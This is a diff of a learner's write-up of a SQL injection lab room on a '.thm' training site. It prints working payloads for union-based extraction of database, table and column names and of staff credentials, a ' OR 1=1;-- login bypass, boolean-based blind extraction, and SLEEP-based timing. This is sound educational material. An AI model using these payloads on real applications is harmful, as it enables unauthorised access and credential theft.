@@ -2,34 +2,73 @@ The goal of this room was to understand how sql injection works and try it out i
 in-band,blind,boolean and time-based injection.
 LEVEL1:union-based sqli(in-band)
 A mock browser showed this URL:  https://website.thm/article?id=1  , the first step was to find the correct number of columns, so after "id" i wrote 
-(1 UNION SELECT 1), the number of columns was wrong so i increased the number of columns one by one until i found the correct number that was 3 so:
-(1 UNION SELECT 1,2,3), so that means that the article table has 3 columns.Then i changed the id with the value 0, so the query does not count and it takes only our injected query.Next step is to find the database name,(0 UNION SELECT 1,2,database()), we use column number 3 for the extraction.Then the result is that the db name is sqli_one.We now have to list all the tables of the current db , so i wrote:
-(0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one')
+```
+1 UNION SELECT 1,
+```
+ the number of columns was wrong so i increased the number of columns one by one until i found the correct number that was 3 so:
+ ```
+1 UNION SELECT 1,2,3
+```
+, so that means that the article table has 3 columns.Then i changed the id with the value 0, so the query does not count and it takes only our injected query.Next step is to find the database name,
+```
+0 UNION SELECT 1,2,database(),
+```
+ we use column number 3 for the extraction.Then the result is that the db name is sqli_one.We now have to list all the tables of the current db , so i wrote:
+ ```
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+```
 'group_concat' is a function that returns more results in a single string instead of more, 'information_schema.tables' is the catalog table that contains all the tables on the server, 'table_schema' is the column where the db is stored.
 You can now see the tables and one of them is 'staff_users'
 Now we have to list the columns in a similar way:
-(0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'):This reveals columns "id","username" and "password". Now we can easily exract credentials with this query:
-(0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users).
+```
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+```
+:This reveals columns "id","username" and "password". Now we can easily exract credentials with this query:
+```
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+```
 You will find martins password so you can go on the level 2
 
 LEVEL2:
 a login form like that:  https://website.thm/login
 now we have blind-sqli, we do not see the errors or something else on the screen, it just show success or failure.
-We can compile the username field with: "' OR 1=1;--" and the password field with anything.
+We can compile the username field with: 
+```
+' OR 1=1;--
+```
+and the password field with anything.
 This actually works because the condition 1=1 is always true and we use '--' to make anything after our query a comment, so the query is:
-(select * from users where username='' OR 1=1;--' and password='anything' LIMIT 1;)
+```
+select * from users where username='' OR 1=1;--' and password='anything' LIMIT 1;
+```
 LEVEL3:BOOLEAN BASED SQLI
 The main thing of this level is the boolean result, true or false.You do not see anything,only true or false.
-Step 1: Confirm injecion:(admin123' UNION SELECT 1,2,3 where database() like '%';--) 
+Step 1: Confirm injecion:
+```
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+```
 This always returns true because the % wildcard matches anything so the conditions is always true.
-Step 2:Get the databse name: We can use this command:(admin123' UNION SELECT 1,2,3 where database() like 's%';--),this will return '{"taken":true}' so the first letter of the db is 's'.Continue like this for the full database name.
+Step 2:Get the databse name: We can use this command:
+```
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+```
+,this will return '{"taken":true}' so the first letter of the db is 's'.Continue like this for the full database name.
 Step 3: Tables name
-In a similar way, we can find the table name with the same logic:(admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--).So on for the full name
+In a similar way, we can find the table name with the same logic:
+```
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
+```
+.So on for the full name
 Step 4:Columns name
-(admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--)You find username and password columns.
+```
+admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--
+```
+You find username and password columns.
 Step 5:Get the username and the password
+```
 (admin123' UNION SELECT 1,2,3 from users where username like 'a%';--)\\username command
 (admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--)\\password command
+```
 On the level 4, you have the time-based sqli and you just have to put a delay in the command like this:
 SLEEP(5);if true, it will sleep for 5 seconds.
 
